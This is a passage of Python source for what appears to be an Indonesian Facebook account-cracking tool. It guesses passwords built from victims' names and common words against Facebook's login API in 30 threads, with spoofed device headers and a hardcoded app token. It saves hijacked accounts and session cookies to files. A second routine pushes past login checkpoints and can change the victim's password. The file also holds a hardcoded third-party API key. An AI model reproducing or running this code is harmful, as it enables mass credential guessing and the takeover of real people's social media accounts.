                )
                exit()
            self.manual(pwx)
        else:
            self.otomatis()

    def manual(self, pw):
        global prog, des
        prog = Progress(
            SpinnerColumn("clock"),
            TextColumn("{task.description}"),
            BarColumn(),
            TextColumn("{task.percentage:.0f}% ]"),
        )
        des = prog.add_task("", total=len(tampung))
        with prog:
            with ThreadPoolExecutor(max_workers=30) as fall:
                self.simpan_hasil()
                for data in tampung:
                    user = data.split("<=>")[0]
                    nama = data.split("<=>")[1]
                    pwx = pw
                    fall.submit(self.metode_api, user, pwx)
        prints(
            Panel(
                f"""{P2}   berhasil crack total {len(tampung)} id, dengan hasil OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}""",
                width=87,
                padding=(0, 8),
                style=f"{color_panel}",
            )
        )
        sys.exit()

    def otomatis(self):
        global prog, des
        prog = Progress(
            TextColumn("{task.description}"),
            BarColumn(),
            TextColumn("{task.percentage:.0f}% ]"),
        )
        des = prog.add_task("", total=len(tampung))
        with prog:
            with ThreadPoolExecutor(max_workers=30) as fall:
                self.simpan_hasil()
                for data in tampung:
                    try:
                        pwx = []
                        user = data.split("<=>")[0]
                        nama = data.split("<=>")[1]
                        depan = nama.split(" ")[0]
                        if len(nama) <= 5:
                            if len(depan) < 3:
                                pass
                            else:
                                pwx.append(depan + "123")
                                pwx.append(depan + "111")
                                pwx.append(depan + "321")
                                pwx.append(depan + "1234")
                                pwx.append(depan + "12345")
                                pwx.append(depan + "123456")
                                pwx.append("ganteng")
                                pwx.append("moonton")
                                pwx.append("ganteng123")
                                pwx.append("katasandi")
                                pwx.append("freefire")
                                pwx.append("freefire123")
                        else:
                            if len(depan) < 3:
                                pwx.append(nama)
                                pwx.append(nama + "123")
                                pwx.append(nama + "321")
                            else:
                                pwx.append(nama)
                                pwx.append(depan + "123")
                                pwx.append(depan + "321")
                                pwx.append(depan + "1234")
                                pwx.append(depan + "12345")
                                pwx.append(depan + "123456")
                                pwx.append("kata sandi")
                                pwx.append("free fire")
                                pwx.append("free fire123")
                                pwx.append("123456")
                            belakang = nama.split(" ")[1]
                            if len(belakang) < 3:
                                pwx.append(depan + belakang)
                                pwx.append(depan + belakang + "123")
                                pwx.append(depan + belakang + "321")
                                pwx.append(depan + belakang + "1234")
                                pwx.append(depan + belakang + "12345")
                                pwx.append(depan + belakang + "123456")
                            else:
                                pwx.append(depan + belakang)
                                pwx.append(belakang + "123")
                                pwx.append(belakang + "321")
                                pwx.append(belakang + "1234")
                                pwx.append(belakang + "12345")
                                pwx.append("kontol")
                                pwx.append("bangsat")
                                pwx.append("indonesia")
                                pwx.append("kontol123")
                                pwx.append("bismillah")
                                pwx.append("mobile legends")
                                pwx.append("domino123")
                        fall.submit(self.metode_api, user, pwx)
                    except:
                        fall.submit(self.metode_api, user, pwx)
        prints(
            Panel(
                f"""{P2}   berhasil crack total {len(tampung)} id, dengan hasil OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}""",
                width=87,
                padding=(0, 8),
                style=f"{color_panel}",
            )
        )
        sys.exit()

    def metode_api(self, email, pwx):
        prog.update(
            des,
            description=f" {P2}# {H2}Luffy-XD {P2}[{P2}{str(self.loop)}{P2}/{P2}{len(tampung)}{P2}]{P2} [OK : {U2}{len(self.ok)}{P2} CP : {B2}{len(self.cp)}{P2}] [",
        )
        prog.advance(des)
        try:
            for pw in pwx:
                pw = pw.lower()
                ua = random.choice(ugent)
                params = {
                    "access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
                    "sdk_version": {random.randint(1, 26)},
                    "email": email,
                    "locale": "en_US",
                    "password": pw,
                    "sdk": "android",
                    "generate_session_cookies": "1",
                    "sig": "4f648f21fb58fcd2aa1c65f35f441ef5",
                }
                headers = {
                    "Host": "graph.facebook.com",
                    "x-fb-connection-bandwidth": str(
                        random.randint(20000000, 30000000)
                    ),
                    "x-fb-sim-hni": str(random.randint(20000, 40000)),
                    "x-fb-net-hni": str(random.randint(20000, 40000)),
                    "x-fb-connection-quality": "EXCELLENT",
                    "user-agent": ua,
                    "content-type": "application/x-www-form-urlencoded",
                    "x-fb-http-engine": "Liger",
                }
                post = ses.post(
                    "https://graph.facebook.com/auth/login",
                    params=params,
                    headers=headers,
                    allow_redirects=False,
                )
                if "session_key" in post.text and "EAA" in post.text:
                    coki = ";".join(
                        i["name"] + "=" + i["value"]
                        for i in post.json()["session_cookies"]
                    )
                    user = re.findall("c_user=(\\d+)", coki)[0]
                    if user in self.ok or user in self.cp:
                        break
                    else:
                        self.ok.append(user)
                        tree = Tree(" ", guide_style=f"{color_ok}")
                        tree.add(
                            Panel(
                                f"{U2}       Succes-Login{P2}",
                                width=30,
                                padding=(0, 2),
                                style=f"{color_ok}",
                            )
                        )
                        tree.add(f"\r{AA}User ID {P2}  : {U2}{user}")
                        tree.add(f"{AA}Password {P2} : {U2}{pw}")
                        tree.add(
                            Panel(
                                f"{U2}{coki}{P2}",
                                width=83,
                                padding=(0, 2),
                                style=f"{color_ok}",
                            )
                        )
                        tree.add(
                            Panel(
                                f"{U2}{ua}{P2}",
                                width=83,
                                padding=(0, 2),
                                style=f"{color_ok}",
                            )
                        )
                        prints(tree)
                        open(f"OK/{self.hari_ini}.txt", "a").write(
                            f"{user}|{pw}|{coki}\n"
                        )
                        break
                elif "User must verify their account" in post.text:
                    user = post.json()["error"]["error_data"]["uid"]
                    if user in self.ok or user in self.cp:
                        break
                    else:
                        self.cp.append(user)
                        tree = Tree(" ", guide_style=f"{color_cp}")
                        tree.add(
                            Panel(
                                f"{B2}   Checkpoint-Login{P2}",
                                width=30,
                                padding=(0, 2),
                                style=f"{color_cp}",
                            )
                        )
                        tree.add(f"\r{AA}User ID {P2}     : {B2}{user}")
                        tree.add(f"{AA}Password {P2}    : {B2}{pw}")
                        tree.add(
                            Panel(
                                f"{B2}{ua}{P2}",
                                width=83,
                                padding=(0, 2),
                                style=f"{color_cp}",
                            )
                        )
                        prints(tree)
                        open(f"CP/{self.hari_ini}.txt", "a").write(f"{user}|{pw}\n")
                        break
                elif (
                    "Calls to this api have exceeded the rate limit. (613)" in post.text
                ):
                    prog.update(
                        des,
                        description=f" {H2}•{P2} crack {M2}spam{P2} {str(self.loop)}/{len(tampung)} OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}",
                    )
                    prog.advance(des)
                    time.sleep(30)
                else:
                    continue
        except ConnectionError:
            time.sleep(30)
            self.metode_api(user, pwx)
        self.loop += 1

    def simpan_hasil(self):
        prints(
            Panel(
                f"""\r     {P2}hasil crack {U2}ok{P2} tersimpan ke : {U2}OK/{self.hari_ini}.txt{P2}
{P2}     hasil crack {B2}cp {P2}tersimpan ke : {B2}CP/{self.hari_ini}.txt{P2}""",
                width=87,
                padding=(0, 10),
                style=f"{color_panel}",
            )
        )
        prints(
            Panel(
                f"""\r     {P2}Jika Tidak Ada Hasil Hidupkan Mode Pesawat 5 Detik {U2}!!!""",
                width=87,
                padding=(0, 10),
                style=f"{color_panel}",
            )
        )


class Lain:
    def __init__(self, cookie):
        self.cookie = cookie
        self.file = []
        self.listfile = []

    def menu(self):
        prints(
            Panel(
                f"""{P2}[{U2}01{P2}]. {B2}lihat {AA}akun {U2}hasil crack  {P2}[{U2}04{P2}]. {B2}ganti {AA}warna {U2}tema tools
{P2}[{U2}02{P2}]. {B2}get info {AA}akun {U2}target    {P2}[{U2}05{P2}]. {B2}tampilkan {AA}info {U2}cookies
{P2}[{U2}03{P2}]. {B2}setting {AA}user {U2}agent      {P2}[{U2}06{P2}].{B2} Kembali {P2})""",
                width=87,
                padding=(0, 7),
                style=f"{color_panel}",
            )
        )
        menu = console.input(f" {U2}# {P2}pilih menu : ")
        if menu in ["01", "1"]:
            self.cek_hasil()
        elif menu in ["04", "4"]:
            exit(
                prints(
                    Panel(
                        f"""{M2}🙏 mohon maaf fitur ini sedang dalam tahap perbaikan""",
                        width=87,
                        style=f"{color_panel}",
                    )
                )
            )
        elif menu in ["05", "5"]:
            self.tampil_cookie()
        elif menu in ["06", "6"]:
            Menu().menu()
            exit(
                prints(
                    Panel(
                        f"""{H2}berhasil menghapus cookie, silahkan ketik ulang python haki-fb.py""",
                        width=87,
                        style=f"{color_panel}",
                    )
                )
            )
        else:
            exit(
                prints(
                    Panel(
                        f"""{M2}🙏 mohon maaf fitur ini sedang dalam tahap perbaikan""",
                        width=87,
                        style=f"{color_panel}",
                    )
                )
            )

    def cek_hasil(self):
        prints(
            Panel(
                f"""{P2}[{U2}01{P2}]. {B2}lihat akun {AA}hasil {U2}crack ok
[{U2}02{P2}]. {B2}lihat akun {AA}hasil {U2}crack cp""",
                width=87,
                padding=(0, 20),
                style=f"{color_panel}",
            )
        )
        ask = console.input(f" {U2}# {P2}masukan pilihan : ")
        if ask in ["1", "01"]:
            folder = "OK"
        else:
            folder = "CP"
        dirs = os.listdir(folder)
        prints(
            Panel(
                f"""{P2} berhasil menemukan {len(dirs)} file hasil crack ok""",
                width=87,
                padding=(0, 15),
                style=f"{color_panel}",
            )
        )
        num = 0
        for fil in dirs:
            num += 1
            self.file.append(fil)
            totalakun = open(f"{folder}/{fil}", "r").read().splitlines()
            self.listfile.append(
                Panel(
                    f"{P2}[{color_text}0{num}{P2}]",
                    width=10,
                    title=f"{P2}nomer",
                    style=eval(
                        XWWWXXXWWXXXXXWWWX(b"66227b636f6c6f725f70616e656c7d22").decode(
                            "8ftu"[::+-+-(-(+1))]
                        )
                    ),
                )
            )
            self.listfile.append(
                Panel(
                    f"{P2}{fil}",
                    width=35,
                    title=f"{P2}tanggal",
                    style=eval(
                        XWWWXXXWWXXXXXWWWX(b"66227b636f6c6f725f70616e656c7d22").decode(
                            "8ftu"[::+-+-(-(+1))]
                        )
                    ),
                )
            )
            self.listfile.append(
                Panel(
                    f"{P2}{len(totalakun)} akun",
                    width=28,
                    title=f"{P2}total akun",
                    style=eval(
                        XWWWXXXWWXXXXXWWWX(b"66227b636f6c6f725f70616e656c7d22").decode(
                            "8ftu"[::+-+-(-(+1))]
                        )
                    ),
                )
            )
        console.print(Columns(self.listfile))
        prints(
            Panel(
                f"""{P2}kamu hanya perlu memilih dan memasukan nomer dari file crack di atas""",
                width=87,
                style=f"{color_panel}",
            )
        )
        result = console.input(f" {U2}# {P2}masukan angka : ")
        try:
            files = self.file[int(result) - 1]
            totalhasil = open(f"{folder}/{files}", "r").read().splitlines()
        except:
            prints(
                Panel(
                    f"""{M2}file yang anda masukan tidak tersedia atau input kamu tidak benar""",
                    width=87,
                    style=f"{color_panel}",
                )
            )
            exit()
        nama_file = (f"{files}").replace("-", " ").replace(".txt", "")
        prints(
            Panel(
                f"""{P2}nama file hasil crack : {nama_file} dan terdapat total akun : {len(totalhasil)}""",
                width=87,
                style=f"{color_panel}",
            )
        )
        for akun in totalhasil:
            user = akun.split("|")[0]
            pw = akun.split("|")[1]
            tree = Tree(" ")
            if folder == "OK":
                cookie = akun.split("|")[2]
                tree.add(f"\r{U2}{user}|{pw}{P2} ")
                tree.add(f"{H2}{cookie}{P2}")
            else:
                tree.add(f"\r{B2}{user}|{pw}{P2} ")
            prints(tree)
        prints(
            Panel(
                f"""{P2} berhasil mengecek dan mendapatkan total {len(totalhasil)} akun dari file""",
                width=87,
                padding=(0, 7),
                style=f"{color_panel}",
            )
        )
        exit()

    def ganti_tema(self):
        prints(
            Panel(
                f"""{P2}[{color_text}01{P2}]. ganti warna tema merah  [{color_text}06{P2}]. ganti warna tema pink
[{color_text}02{P2}]. ganti warna tema hijau  [{color_text}07{P2}]. ganti warna tema cyan
[{color_text}03{P2}]. ganti warna tema kuning [{color_text}08{P2}]. ganti warna tema putih
[{color_text}04{P2}]. ganti warna tema biru   [{color_text}09{P2}]. ganti warna tema orange
[{color_text}05{P2}]. ganti warna tema ungu   [{color_text}10{P2}]. ganti warna tema abu2""",
                width=87,
                padding=(0, 7),
                style=f"{color_panel}",
            )
        )
        ask = console.input(f" {H2}• {P2}pilih tema : ")
        if ask in ["01", "1"]:
            warna = "[#FF0000]"
            teks = "merah"
        elif ask in ["02", "2"]:
            warna = "[#00FF00]"
            teks = "hijau"
        elif ask in ["03", "3"]:
            warna = "[#FFFF00]"
            teks = "kuning"
        elif ask in ["04", "4"]:
            warna = "[#00C8FF]"
            teks = "biru"
        elif ask in ["05", "5"]:
            warna = "[#AF00FF]"
            teks = "ungu"
        elif ask in ["06", "6"]:
            warna = "[#FF00FF]"
            teks = "pink"
        elif ask in ["07", "7"]:
            warna = "[#00FFFF]"
            teks = "cyan"
        elif ask in ["08", "8"]:
            warna = "[#FFFFFF]"
            teks = "putih"
        elif ask in ["09", "9"]:
            warna = "[#FF8F00]"
            teks = "orange"
        elif ask in ["10"]:
            warna = "[#AAAAAA]"
            teks = "abu-abu"
        open("data/theme_color", "w").write(
            warna + "|" + warna.replace("[", "").replace("]", "")
        )
        prints(
            Panel(
                f"""{H2}berhasil mengganti tema ke {teks}, silahkan mulai ulang tools""",
                width=87,
                padding=(0, 6),
                style=f"{color_panel}",
            )
        )
        sys.exit()

    def tampil_cookie(self):
        now = datetime.now()
        hari = now.day + int(30)
        if hari > 30:
            hari = hari - 30
        bulan = now.month + 1
        if bulan > 12:
            bulan = bulan - 12
        if now.month + 1 > 12:
            tahun = now.year + 1
        data = date(year=tahun, month=bulan, day=hari)
        aktif = data.strftime("%d %B %Y")
        console.print(f" {H2}• {P2}aktif sampai : {aktif}")
        prints(
            Panel(
                f"""{H2}{self.cookie.get('cookie')}""", width=87, style=f"{color_panel}"
            )
        )
        sys.exit()


import requests, shutil, os, re, bs4, sys, json, time, platform, random, datetime, subprocess, logging, base64
import hmac, hashlib, urllib, stdiomask, urllib.request, uuid
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from threading import Thread, Event
from time import sleep as jeda
from datetime import datetime

ct = datetime.now()
n = ct.month
bulan_ = [
    "January",
    "Februari",
    "Maret",
    "April",
    "Mei",
    "Juni",
    "Juli",
    "Agustus",
    "September",
    "Oktober",
    "November",
    "Desember",
]
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month
waktu = "%s-%s-%s" % (hari, bulan, tahun)
bulan12 = {
    "01": "January",
    "02": "Februari",
    "03": "Maret",
    "04": "April",
    "05": "Mei",
    "06": "Juni",
    "07": "Juli",
    "08": "Agustus",
    "09": "September",
    "10": "Oktober",
    "11": "November",
    "12": "Desember",
}
M = "[1;91m"  # MERAH
H = "[1;92m"  # HIJAU
K = "[1;93m"  # KUNING
B = "[1;94m"  # BIRU
U = "[1;95m"  # UNGU
O = "[1;96m"  # BIRU MUDA
P = "[1;97m"  # PUTIH
J = "[38;2;255;127;0;1m"  # ORANGE
N = "[0m"  # WARNA MATI
acak = [M, H, K, B, U, O, P, J]
warna = random.choice(acak)
til = "[0m "


def jalan(keliling):
    for mau in keliling + "\n":
        sys.stdout.write(mau)
        sys.stdout.flush()
        jeda(0.03)


ubah_pass = []
pwbaru = []
pwBaru = []
ubahP = []


def file_cp():
    dirs = os.listdir("CP")
    prints(
        Panel(
            f"""{P2}copy nama file hasil crack di bawah ini kemudian pastekan di bawah untuk cek opsi""",
            width=87,
            style=f"{color_panel}",
        )
    )
    for file in dirs:
        prints(Panel(f"""{K2}{(file)}""", width=87, style=f"{color_panel}"))
    try:
        prints(
            Panel(
                f"""{P2}copy nama file di atas kemudian tempel di bawah ini contoh {M2}: {H2}{waktu}.txt""",
                width=87,
                style=f"{color_panel}",
            )
        )
        opsi()
    except IOError:
        prints(
            Panel(
                f"""{M2}Tidak ada file untuk di cek silahkan crack dulu""",
                width=87,
                style=f"{color_panel}",
            )
        )
        Menu().menu()


def opsi():
    CP = "CP/"
    romi = console.input(
        f" {U2}# {P2}Tempel atau masukan nama file yang ingin di cek disini : "
    )
    if romi == "":
        prints(Panel(f"""{B2}isi yang benar""", width=87, style=f"{color_panel}"))
        opsi()
    try:
        file_cp = open(CP + romi, "r").readlines()
    except IOError:
        exit(
            prints(
                Panel(
                    f"""{P2}nama file{K2} {(romi)} {P2}tidak di temukan""",
                    width=87,
                    style=f"{color_panel}",
                )
            )
        )
    prints(
        Panel(
            f"""{P2}sebelem melanjutkan hidupkan mode pesawat selama 10 detik""",
            width=87,
            style=f"{color_panel}",
        )
    )
    pw = console.input(f" {U2}# {P2}ubah password ketika tab yes y/n : ")
    if pw in ["y", "Y"]:
        ubah_pass.append("ubah_sandi")
        pw2 = console.input(f" {U2}# {P2}Masukan Password baru :{H2} ")
        if len(pw2) <= 5:
            prints(
                Panel(
                    f"""{P2}Sandi minimal 6 karakter""",
                    width=87,
                    style=f"{color_panel}",
                )
            )
        else:
            pwbaru.append(pw2)
    prints(
        Panel(
            f"""{P2}Total akun {M2}:{H2} {str(len(file_cp))}""",
            width=87,
            style=f"{color_panel}",
        )
    )
    nomor = 0
    for fb in file_cp:
        akun = fb.replace("\n", "")
        ngecek = akun.split("|")
        nomor += 1
        prints(
            Panel(
                f"""{P2}[{H2}{(str(nomor))}{P2}] {P2}Cek sesi akun {B2}>=> {B2}{akun}""",
                width=87,
                style=f"{color_panel}",
            )
        )
        jeda(0.1)
        try:
            mengecek(ngecek[0].replace("", ""), ngecek[1])
        except requests.exceptions.ConnectionError:
            continue
    print("\n")
    Console(width=30).print(
        Panel(f"[bold green]SELESAI MENGECEK OPSI", style="red"), justify="left"
    )
    console.input(f" {U2}# {P2}Tekan Enter")
    Menu().menu()


data = {}
data2 = {}


def mengecek(user, pw):
    global loop, ubah_pass, pwbaru
    session = requests.Session()
    ua = "Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36"
    url = "https://mbasic.facebook.com"
    session.headers.update(
        {
            "Host": "mbasic.facebook.com",
            "cache-control": "max-age=0",
            "upgrade-insecure-requests": "1",
            "origin": "https://mbasic.facebook.com",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": ua,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "x-requested-with": "mark.via.gp",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "navigate",
            "sec-fetch-user": "?1",
            "sec-fetch-dest": "document",
            "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8",
            "accept-encoding": "gzip, deflate",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        }
    )
    soup = bs4.BeautifulSoup(
        session.get(url + "/login/?next&ref=dbl&fl&refid=8").text, "html.parser"
    )
    link = soup.find("form", {"method": "post"})
    for x in soup("input"):
        data.update({x.get("name"): x.get("value")})
    data.update({"email": user, "pass": pw})
    urlPost = session.post(url + link.get("action"), data=data)
    response = bs4.BeautifulSoup(urlPost.text, "html.parser")
    if "c_user" in session.cookies.get_dict():
        if "Akun Anda Dikunci" in urlPost.text:
            print("\r%s%s[0m akun terkunci sesi new" % (M, til))
        else:
            print("\r%s%s[0m akun tidak checkpoint, silahkan anda login " % (til, H))
            open("OK/OK-%s.txt" % (waktu), "a").write(" %s|%s\n" % (user, pw))
    elif "checkpoint" in session.cookies.get_dict():
        coki = (";").join(
            [
                "%s=%s" % (key, value)
                for key, value in session.cookies.get_dict().items()
            ]
        )
        title = re.findall("\\<title>(.*?)<\\/title>", str(response))
        link2 = response.find("form", {"method": "post"})
        listInput = ["fb_dtsg", "jazoest", "checkpoint_data", "submit[Continue]", "nh"]
        for x in response("input"):
            if x.get("name") in listInput:
                data2.update({x.get("name"): x.get("value")})
        an = session.post(url + link2.get("action"), data=data2)
        response2 = bs4.BeautifulSoup(an.text, "html.parser")
        cek = [cek.text for cek in response2.find_all("option")]
        number = 0
        print("\r%s%s [0m terdapat %s%s%s [0mopsi %s:" % (U, O, P, str(len(cek)), O, M))
        jeda(0.07)
        if len(cek) == 0:
            if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
                if "ubah_sandi" in ubah_pass:
                    dat, dat2 = {}, {}
                    but = ["submit[Yes]", "nh", "fb_dtsg", "jazoest", "checkpoint_data"]
                    for x in response("input"):
                        if x.get("name") in but:
                            dat.update({x.get("name"): x.get("value")})
                    ubahPw = session.post(url + link2.get("action"), data=dat).text
                    resUbah = bs4.BeautifulSoup(ubahPw, "html.parser")
                    link3 = resUbah.find("form", {"method": "post"})
                    but2 = ["submit[Next]", "nh", "fb_dtsg", "jazoest"]
                    if "Buat Kata Sandi Baru" in re.findall(
                        "\\<title>(.*?)<\\/title>", str(ubahPw)
                    ):
                        for b in resUbah("input"):
                            dat2.update({b.get("name"): b.get("value")})
                        dat2.update({"password_new": "".join(pwbaru)})
                        an = session.post(url + link3.get("action"), data=dat2)
                        coki = (";").join(
                            [
                                "%s=%s" % (key, value)
                                for key, value in session.cookies.get_dict().items()
                            ]
                        )
                        print(
                            "\r%s%s[0makun one tab, sandi berhasil di ubah \n OK %s%s%s|%s|%s\t\t\t"
                            % (H, til, N, H, user, pwbaru[0], coki)
                        )
                        open("OK/OK-%s.txt" % (waktu), "a").write(
                            "%s%s|%s|%s\n" % (H, user, pwbaru[0], coki)
                        )
                else:
                    print(
                        "\r%s%s [0m[1;92mCheckpoint Terbuka, Akun Tap Yes Silahkan Login\t\t"
                        % (H, til)
                    )
                    tree = Tree(" ", guide_style=f"{color_ok}")
                    tree.add(
                        Panel(
                            f"{H2}{ua}{P2}",
                            width=83,
                            padding=(0, 2),
                            style=f"{color_ok}",
                        )
                    )
                    prints(tree)
                    open("OK/OK-%s.txt" % (waktu), "a").write(
                        "%s %s|%s|%s\n" % (H, user, pw, coki)
                    )
            elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall(
                "\\<title>(.*?)<\\/title>", str(response)
            ):
                print("\r%s[0m akun terpasang autentikasi dua faktor\t\t\t" % (M))
            else:
                print("%s%s[0mterjadi kesalahan" % (M, til))
        else:
            if "c_user" in session.cookies.get_dict():
                print("\r%s%s akun tidak checkpoint, silahkan anda login " % (H))
                open("OK/OK-%s.txt" % (waktu), "a").write("%s%s|%s\n" % (H, user, pw))
        for opsi in range(len(cek)):
            number += 1
            jalan("  %s%s. %s%s" % (P, str(number), K, cek[opsi]))
    elif "login_error" in str(response):
        oh = run.find("div", {"id": "login_error"}).find("div").text
        print("%s %s" % (M, oh))
    else:
        tree = Tree(" ", guide_style=f"{color_panel}")
        tree.add(
            Panel(
                f"{O2}login gagal, silahkan cek kembali id dan kata sandi{P2}",
                width=83,
                padding=(0, 2),
                style=f"{color_panel}",
            )
        )
        prints(tree)


def scarpping_ua():
    url = "https://api.apilayer.com/user_agent/generate?android=true&chrome=true"
    header = {"apikey": "2ZxXnjQByF6rPu3GM5DtcEmrJfKqB5xL"}
    try:
        response = requests.get(url, headers=header)
        if response.status_code == 200:
            uascrap.append(response.json()["ua"])
        else:
            uascrap.append(
                "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36"
            )
    except requests.exceptions.ConnectionError:
        uascrap.append(
            "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36"
        )


class Session:
    def generate_ugent(self):
        ugent = f"Mozilla/5.0 (Linux; Android 9; SM-S367VL Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.89 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/222.0.0.15.124;]"
        return ugent


if __name__ == "__main__":
    try:
        os.system("git pull")
    except:
        pass
    try:
        os.mkdir("OK")
    except:
        pass
    try:
        os.mkdir("CP")
    except:
        pass
    try:
        os.mkdir("data")
    except:
        pass
    Menu().menu()
